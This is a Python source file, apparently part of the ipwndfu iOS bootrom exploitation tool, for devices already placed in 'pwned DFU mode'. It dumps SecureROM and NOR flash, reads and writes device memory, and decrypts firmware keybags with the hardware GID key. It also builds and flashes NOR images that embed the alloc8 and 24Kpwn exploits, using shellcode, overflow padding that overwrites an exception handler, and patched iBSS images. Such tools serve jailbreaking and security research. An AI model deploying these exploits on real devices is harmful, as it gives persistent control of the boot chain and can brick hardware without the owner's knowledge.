import binascii, datetime, hashlib, struct, sys, time
import usb # pyusb: use 'pip install pyusb' to install this module
import dfu, recovery, image3, utilities

EXEC_MAGIC = 'exec'[::-1]
AES_BLOCK_SIZE = 16
AES_GID_KEY = 0x20000200
AES_UID_KEY = 0x20000201
AES_ENCRYPT = 16
AES_DECRYPT = 17

class PwnedDeviceConfig:
    def __init__(self, version, cpid, aes_crypto_cmd, memmove, get_block_device, load_address, rom_address, rom_size, rom_sha256):
        self.version = version
        self.cpid = cpid
        self.aes_crypto_cmd = aes_crypto_cmd
        self.memmove = memmove
        self.get_block_device = get_block_device
        self.load_address = load_address
        self.rom_address = rom_address
        self.rom_size = rom_size
        self.rom_sha256 = rom_sha256

configs = [
    #PwnedDeviceConfig(
    #    # S5L8720 (old bootrom)
    #    version='240.4',
    #    cpid='8720',
    #    aes_crypto_cmd=0x899,
    #    memmove=0x795c,
    #    get_block_device=0x1091,
    #    load_address=0x22000000,
    #    rom_address=0x20000000,
    #    rom_size=0x10000,
    #    rom_sha256='55f4d8ea2791ba51dd89934168f38f0fb21ce8762ff614c1e742407c0d3ca054'
    #),
    #PwnedDeviceConfig(
    #    # S5L8720 (new bootrom)
    #    version='240.5.1',
    #    cpid='8720',
    #    aes_crypto_cmd=0x899,
    #    memmove=0x7964,
    #    get_block_device=0x1091,
    #    load_address=0x22000000,
    #    rom_address=0x20000000,
    #    rom_size=0x10000,
    #    rom_sha256='f15ae522dc9e645fcf997f6cec978ed3ce1811915e84938c68203fb95d80d300'
    #),
    PwnedDeviceConfig(
        # S5L8920 (old bootrom)
        version='359.3',
        cpid='8920',
        aes_crypto_cmd=0x925,
        memmove=0x83d4,
        get_block_device=0x1351,
        load_address=0x84000000,
        rom_address=0xbf000000,
        rom_size=0x10000,
        rom_sha256='99fd16f919a506c7f0701620e132e18c0e6f4025a57a85807960ca092e5e3587'
    ),
    PwnedDeviceConfig(
        # S5L8920 (new bootrom)
        version='359.3.2',
        cpid='8920',
        aes_crypto_cmd=0x925,
        memmove=0x83dc,
        get_block_device=0x1351,
        load_address=0x84000000,
        rom_address=0xbf000000,
        rom_size=0x10000,
        rom_sha256='0e6feb1144c95b1ee088ecd6c45bfdc2ed17191167555b6ca513d6572e463c86'),
    PwnedDeviceConfig(
       # S5L8922
       version='359.5',
       cpid='8922',
       aes_crypto_cmd=0x919,
       memmove=0x8564,
       get_block_device=0x1851,
       load_address=0x84000000,
       rom_address=0xbf000000,
       rom_size=0x10000,
       rom_sha256='07b8a615f00961c5802451b5717c344db287b68c5f6d2331ac6ba7a6acdbac9d'
    ),
    PwnedDeviceConfig(
       # S5L8930
       version='574.4',
       cpid='8930',
       aes_crypto_cmd=0x686d,
       memmove=0x84dc,
       get_block_device=0x81d5,
       load_address=0x84000000,
       rom_address=0xbf000000,
       rom_size=0x10000,
       rom_sha256='4f34652a238a57ae0018b6e66c20a240cdbee8b4cca59a99407d09f83ea8082d'
    ),
]

alloc8_constants_359_3 = [
    0x84034000, #  1 - MAIN_STACK_ADDRESS
         0x544, #  2 - clean_invalidate_data_cache
    0x84024020, #  3 - gNorImg3List
        0x1ccd, #  4 - free
        0x3ca1, #  5 - exit_critical_section
        0x451d, #  6 - home_button_pressed
        0x450d, #  7 - power_button_pressed
        0x44e1, #  8 - cable_connected
    0x696c6c62, #  9 - ILLB_MAGIC
        0x1f6f, # 10 - get_nor_image
    0x84000000, # 11 - LOAD_ADDRESS
       0x24000, # 12 - MAX_SIZE
        0x3969, # 13 - jump_to
        0x38a1, # 14 - usb_create_serial_number_string
        0x8e7d, # 15 - strlcat
        0x349d, # 16 - usb_wait_for_image
    0x84024228, # 17 - gLeakingDFUBuffer
    0x65786563, # 18 - EXEC_MAGIC
        0x1f79, # 19 - memz_create
        0x1fa1, # 20 - memz_destroy
    0x696d6733, # 21 - IMG3_STRUCT_MAGIC
    0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC
        0x1fe5, # 23 - image3_create_struct
        0x2655, # 24 - image3_load_continue
        0x277b, # 25 - image3_load_fail
]

alloc8_constants_359_3_2 = [
    0x84034000, #  1 - MAIN_STACK_ADDRESS
         0x544, #  2 - clean_invalidate_data_cache
    0x84024020, #  3 - gNorImg3List
        0x1ccd, #  4 - free
        0x3ca9, #  5 - exit_critical_section
        0x4525, #  6 - home_button_pressed
        0x4515, #  7 - power_button_pressed
        0x44e9, #  8 - cable_connected
    0x696c6c62, #  9 - ILLB_MAGIC
        0x1f77, # 10 - get_nor_image
    0x84000000, # 11 - LOAD_ADDRESS
       0x24000, # 12 - MAX_SIZE
        0x3971, # 13 - jump_to
        0x38a9, # 14 - usb_create_serial_number_string
        0x8e85, # 15 - strlcat
        0x34a5, # 16 - usb_wait_for_image
    0x84024228, # 17 - gLeakingDFUBuffer
    0x65786563, # 18 - EXEC_MAGIC
        0x1f81, # 19 - memz_create
        0x1fa9, # 20 - memz_destroy
    0x696d6733, # 21 - IMG3_STRUCT_MAGIC
    0x4d656d7a, # 22 - MEMZ_STRUCT_MAGIC
        0x1fed, # 23 - image3_create_struct
        0x265d, # 24 - image3_load_continue
        0x2783, # 25 - image3_load_fail
]

def empty_img3_data(size):
    assert size >= 20
    return struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\x00' * (size - 20)

class PwnedDFUDevice():
    def __init__(self):
        device = dfu.acquire_device()
        self.identifier = device.serial_number
        dfu.release_device(device)

        if 'PWND:[' not in self.identifier:
            print 'ERROR: Device is not in pwned DFU Mode. Use -p flag to exploit device and then try again.'
            sys.exit(1)

        if 'CPID:8720' in self.identifier:
            print 'ERROR: This feature is not supported on iPod Touch (2nd generation).'
            sys.exit(1)

        self.config = None
        for config in configs:
            if 'SRTG:[iBoot-%s]' % config.version in self.identifier:
                self.config = config
                break
        if self.config is None:
            print 'ERROR: Device seems to be in pwned DFU Mode, but a matching configuration was not found.'
            sys.exit(1)

    def ecid_string(self):
        tokens = self.identifier.split()
        for token in tokens:
            if token.startswith('ECID:'):
                return token[5:]
        print 'ERROR: ECID is missing from USB serial number string.'
        sys.exit(1)

    def execute(self, cmd, receiveLength):
        device = dfu.acquire_device()
        assert self.identifier == device.serial_number

        dfu.reset_counters(device)
        dfu.send_data(device, EXEC_MAGIC + cmd)
        dfu.request_image_validation(device)
        dfu.release_device(device)

        time.sleep(0.5)

        device = dfu.acquire_device()
        assert self.identifier == device.serial_number

        requiredLength = 0x8 + receiveLength
        requiredLength = requiredLength if requiredLength % 0x800 == 0 else requiredLength / 0x800 * 0x800 + 0x800
        received = dfu.get_data(device, requiredLength)
        dfu.release_device(device)

        (exec_cleared, retval) = struct.unpack('<2I', received[:8])
        assert exec_cleared == 0
        return (retval, received[8:8 + receiveLength])

    def securerom_dump(self):
        securerom = self.read_memory(self.config.rom_address, self.config.rom_size)
        if hashlib.sha256(securerom).hexdigest() != self.config.rom_sha256:
            print 'ERROR: SecureROM was dumped, but the SHA256 hash does not match. Exiting.'
            sys.exit(1)
        return securerom

    def aes(self, data, action, key):
        if len(data) % AES_BLOCK_SIZE != 0:
            print 'ERROR: Length of data for AES encryption/decryption must be a multiple of %s.' % AES_BLOCK_SIZE
            sys.exit(1)

        cmd = struct.pack('<8I', self.config.aes_crypto_cmd, action, self.config.load_address + 36, self.config.load_address + 0x8, len(data), key, 0, 0)
        (retval, received) = self.execute(cmd + data, len(data))
        return received[:len(data)]

    def aes_hex(self, hexdata, action, key):
        if len(hexdata) % 32 != 0:
            print 'ERROR: Length of hex data for AES encryption/decryption must be a multiple of %s.' % (2 * AES_BLOCK_SIZE)
            sys.exit(1)

        return binascii.hexlify(self.aes(binascii.unhexlify(hexdata), action, key))

    def read_memory(self, address, length):
        (retval, data) = self.execute(struct.pack('<4I', self.config.memmove, self.config.load_address + 8, address, length), length)
        return data

    def write_memory(self, address, data):
        (retval, data) = self.execute(struct.pack('<4I%ss' % len(data), self.config.memmove, address, self.config.load_address + 20, len(data), data), 0)
        return data

    def nor_dump(self, saveBackup):
        (bdev, empty) = self.execute(struct.pack('<2I5s', self.config.get_block_device, self.config.load_address + 12, 'nor0\x00'), 0)
        if bdev == 0:
            print 'ERROR: Unable to dump NOR. Pointer to nor0 block device was NULL.'
            sys.exit(1)

        data = self.read_memory(bdev + 28, 4)
        (read,) = struct.unpack('<I', data)
        if read == 0:
            print 'ERROR: Unable to dump NOR. Function pointer for reading was NULL.'
            sys.exit(1)

        NOR_PART_SIZE = 0x20000
        NOR_PARTS = 8
        nor = str()
        for i in range(NOR_PARTS):
            print 'Dumping NOR, part %s/%s.' % (i+1, NOR_PARTS)
            (retval, received) = self.execute(struct.pack('<6I', read, bdev, self.config.load_address + 8, i * NOR_PART_SIZE, 0, NOR_PART_SIZE), NOR_PART_SIZE)
            nor += received

        if saveBackup:
            date = datetime.datetime.now().strftime('%Y%m%d-%H%M%S')
            filename = 'nor-backups/nor-%s-%s.dump' % (self.ecid_string(), date)
            f = open(filename, 'wb')
            f.write(nor)
            f.close()
            print 'NOR backed up to file: %s' % filename

        return nor

    def add_24Kpwn_exploit_to_nor(self, nor):
        (img2_magic, block_size, unused, firmware_block, firmware_block_count) = struct.unpack('<4s4I', nor[:20])
        (img2_crc,) = struct.unpack('<I', nor[48:52])
        assert img2_crc == binascii.crc32(nor[:48]) & 0xffffffff

        firmware_offset = firmware_block * block_size
        firmware_length = firmware_block_count * block_size
        nor_firmware = nor[firmware_offset:firmware_offset + firmware_length]

        if self.config.version != '359.3':
            print 'ERROR: This device is not supported.'
            sys.exit(1)

        for c in nor[52:512]:
            if c != '\x00':
                print 'ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely previously installed. Exiting.'
                sys.exit(1)

        new_nor_firmware = str()
        offset = 0
        count = 0
        while 1:
            img3_header = struct.unpack('<4s3I4s', nor_firmware[offset:offset+20])
            if img3_header[0] != 'Img3'[::-1]:
                break
            img3_data = nor_firmware[offset:offset + img3_header[1]]
            img3 = image3.Image3(img3_data)
            if img3_header[4] == 'illb'[::-1]:
                new_nor_firmware += img3.newDecrypted24KpwnLLB(self.securerom_dump())
            else:
                new_nor_firmware += img3.newDecryptedImage3()
            offset += img3_header[1]
            count += 1

        new_nor_firmware += '\xff' * (len(nor_firmware) - len(new_nor_firmware))
        new_nor = nor[0:firmware_offset] + new_nor_firmware + nor[firmware_offset + firmware_length:]
        assert len(nor) == len(new_nor)
        return new_nor

    def add_alloc8_exploit_to_nor(self, nor):
        SHELLCODE_ADDRESS = 0x84026214 + 1
        MAX_SHELLCODE_LENGTH = 460
        REQUIRED_IMG3_COUNT = 714
        NOR_READ_SIZE = 4096

        (img2_magic, block_size, unused, firmware_block, firmware_block_count) = struct.unpack('<4s4I', nor[:20])
        (img2_crc,) = struct.unpack('<I', nor[48:52])
        assert img2_crc == binascii.crc32(nor[:48]) & 0xffffffff

        firmware_offset = firmware_block * block_size
        firmware_length = firmware_block_count * block_size
        nor_firmware = nor[firmware_offset:firmware_offset + firmware_length]

        f = open('bin/alloc8-shellcode.bin', 'rb')
        shellcode = f.read()
        f.close()
        assert len(shellcode) <= MAX_SHELLCODE_LENGTH

        if self.config.version == '359.3':
            constants = alloc8_constants_359_3
            exceptions = [0x5620, 0x5630]
        elif self.config.version == '359.3.2':
            constants = alloc8_constants_359_3_2
            exceptions = [0x5628, 0x5638]
        else:
            print 'ERROR: SecureROM %s is not supported by alloc8.' % self.config.version
            sys.exit(1)

        # Shellcode has placeholder values for constants; check they match and replace with constants from config
        placeholders_offset = len(shellcode) - 4 * len(constants)
        for i in range(len(constants)):
            offset = placeholders_offset + 4 * i
            (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
            assert value == 0xBAD00001 + i

        shellcode = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)

        for c in nor[52:52+MAX_SHELLCODE_LENGTH]:
            if c != '\x00':
                print 'ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely already installed. Exiting.'
                sys.exit(1)

        new_nor_firmware = str()
        offset = 0
        count = 0
        while 1:
            img3_header = struct.unpack('<4s3I4s', nor_firmware[offset:offset+20])
            if img3_header[0] != 'Img3'[::-1]:
                break
            img3_data = nor_firmware[offset:offset + img3_header[1]]
            img3 = image3.Image3(img3_data)
            new_nor_firmware += img3.newDecryptedImage3()
            offset += img3_header[1]
            count += 1

        # Add REQUIRED_IMG3_COUNT - count - 1 empty img3s.
        for i in range(REQUIRED_IMG3_COUNT - count - 1):
            new_nor_firmware += empty_img3_data(block_size)

        # Final img3 must end at the end of the block, followed by SecureROM overwrite data.
        # SHELLCODE_ADDRESS overrides the data abort exception handler.
        final_offset = firmware_offset + len(new_nor_firmware)
        final_size = NOR_READ_SIZE - final_offset % NOR_READ_SIZE
        if final_size < 20:
            final_size += NOR_READ_SIZE
        assert final_size % block_size == 0

        new_nor_firmware += empty_img3_data(final_size) + '\x00' * 0x28 + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions)
        new_nor_firmware += '\xff' * (len(nor_firmware) - len(new_nor_firmware))

        new_nor = nor[0:52] + shellcode + '\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))
        new_nor += nor[52+MAX_SHELLCODE_LENGTH:firmware_offset] + new_nor_firmware + nor[firmware_offset + firmware_length:]
        assert len(nor) == len(new_nor)
        return new_nor

    def boot_ibss(self):
        print 'Sending iBSS.'
        if self.config.cpid != '8920':
            print 'ERROR: Boot iBSS is currently only supported on iPhone 3GS.'
            sys.exit(1)

        help1 = 'Download iPhone2,1_4.3.5_8L1_Restore.ipsw and use the following command to extract iBSS:'
        help2 = 'unzip -p iPhone2,1_4.3.5_8L1_Restore.ipsw Firmware/dfu/iBSS.n88ap.RELEASE.dfu > n88ap-iBSS-4.3.5.img3'
        try:
            f = open('n88ap-iBSS-4.3.5.img3', 'rb')
            data = f.read()
            f.close()
        except:
            print 'ERROR: n88ap-iBSS-4.3.5.img3 is missing.'
            print help1
            print help2
            sys.exit(1)
        if len(data) == 0:
            print 'ERROR: n88ap-iBSS-4.3.5.img3 exists, but is empty (size: 0 bytes).'
            print help1
            print help2
            sys.exit(1)
        if hashlib.sha256(data).hexdigest() != 'b47816105ce97ef02637ec113acdefcdee32336a11e04eda0a6f4fc5e6617e61':
            print 'ERROR: n88ap-iBSS-4.3.5.img3 exists, but is from the wrong IPSW or corrupted.'
            print help1
            print help2
            sys.exit(1)

        iBSS = image3.Image3(data)
        decryptediBSS = iBSS.newDecryptedImage3()
        n88ap_iBSS_435_patches = [
            (0x14954,                     'run\x00'), # patch 'reset' command string to 'run'
            (0x17654, struct.pack('<I', 0x41000001)), # patch 'reset' command handler to LOAD_ADDRESS + 1
        ]
        patchediBSS = decryptediBSS[:64] + utilities.apply_patches(decryptediBSS[64:], n88ap_iBSS_435_patches)

        device = dfu.acquire_device()
        assert self.identifier == device.serial_number
        dfu.reset_counters(device)
        dfu.request_image_validation(device)
        dfu.release_device(device)

        time.sleep(0.5)

        device = dfu.acquire_device()
        assert self.identifier == device.serial_number
        data = dfu.send_data(device, patchediBSS)
        dfu.request_image_validation(device)
        dfu.release_device(device)

        time.sleep(0.5)

        print 'Waiting for iBSS to enter Recovery Mode.'
        device = recovery.acquire_device()
        recovery.release_device(device)

    def flash_nor(self, nor):
        self.boot_ibss()
        print 'Sending iBSS payload to flash NOR.'
        MAX_SHELLCODE_LENGTH = 128
        payload = open('bin/ibss-flash-nor-shellcode.bin', 'rb').read()
        assert len(payload) <= MAX_SHELLCODE_LENGTH
        payload += '\x00' * (MAX_SHELLCODE_LENGTH - len(payload)) + nor

        device = recovery.acquire_device()
        assert 'CPID:8920' in device.serial_number
        recovery.send_data(device, payload)
        try:
            print 'Sending run command.'
            recovery.send_command(device, 'run')
        except usb.core.USBError:
            # OK
            pass
            #print 'Caught USBError; should still work.'
        recovery.release_device(device)
        print 'If screen is not red, NOR was flashed successfully and device will reboot.'

    def decrypt_keybag(self, keybag):
        KEYBAG_LENGTH = 48
        assert len(keybag) == KEYBAG_LENGTH

        KEYBAG_FILENAME = 'aes-keys/S5L%s-firmware' % self.config.cpid
        try:
            f = open(KEYBAG_FILENAME, 'rb')
            data = f.read()
            f.close()
        except IOError:
            data = str()
        assert len(data) % 2 * KEYBAG_LENGTH == 0

        for i in range(0, len(data), 2 * KEYBAG_LENGTH):
            if keybag == data[i:i+KEYBAG_LENGTH]:
                return data[i+KEYBAG_LENGTH:i+2*KEYBAG_LENGTH]

        device = PwnedDFUDevice()
        decrypted_keybag = device.aes(keybag, AES_DECRYPT, AES_GID_KEY)

        f = open(KEYBAG_FILENAME, 'a')
        f.write(keybag + decrypted_keybag)
        f.close()

        return decrypted_keybag